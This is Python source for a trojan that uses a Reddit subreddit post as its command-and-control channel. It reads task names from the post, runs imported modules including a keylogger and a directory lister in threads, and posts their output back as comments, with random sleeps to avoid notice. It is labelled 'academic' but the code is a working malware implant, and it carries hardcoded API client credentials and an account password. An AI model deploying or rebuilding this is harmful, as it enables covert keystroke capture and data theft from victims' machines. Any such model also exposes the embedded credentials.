import importlib
import random
import threading
from datetime import datetime
import sys
import time
import requests

CLIENTID = "bwkVVBg6K7-pDXe2SVvnaQ"
CLIENTSECRET = "byoZCsVrSKvo89oasBR6gC6tACSJRA"

auth = requests.auth.HTTPBasicAuth(CLIENTID, CLIENTSECRET)

data = {
        'grant_type': 'password',
        'username': 'helehulehebe',
        'password':'denemesifre' 
}

headers = {'User-Agent': 'academic-purpose-bot-cnc'} #can put in anythin you want for the user agent it is arbitrary. Just for describing what this bot is

res = requests.post('https://www.reddit.com/api/v1/access_token', auth=auth,data=data,headers=headers)

TOKEN = res.json()['access_token']

headers['authorization'] =f'bearer {TOKEN}'

def post_comment(postBody):
    form = {
        'sr': 'academiccncsub',
        'parent': 't3_z6642p',
        'api_type': "json",
        'text':postBody,
        "extension": "json"
    }
    res = requests.post('https://oauth.reddit.com/api/comment', headers=headers, data=form)

class redditCnC:

    def __init__(self):
        mainPost = "temp"
    
    def get_config(self):
        res = requests.get('https://oauth.reddit.com/r/academiccncsub/hot', headers=headers)

        bodyOfPost = ''

        for post in res.json()['data']['children']:
            if post['data']['id'] == 'z6642p':
                bodyOfPost = post['data']['selftext']
        configOptions = bodyOfPost.split(', ')
        return configOptions
    def module_runner(self, module):
        x = sys.modules[module]
        print(x)
        
        result = sys.modules[module].run()
        self.post_module_result(result)
    def post_module_result(self, data):
        dateTimeVar     = datetime.now().isoformat()
        post_comment(f'//{dateTimeVar}: {data}')
    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target = self.module_runner,
                    args   = (task,))
                thread.start()
                time.sleep(random.randint(1,10))
            time.sleep(random.randint(30*60, 3*60*60))

if __name__ == '__main__':
    files = ['environment', 'dirlister', 'keylogger']

    for f in files:
        globals()[f] = importlib.import_module(f)
    trojan = redditCnC()
    trojan.run()
    
x = redditCnC()
a = x.get_config()
print(a)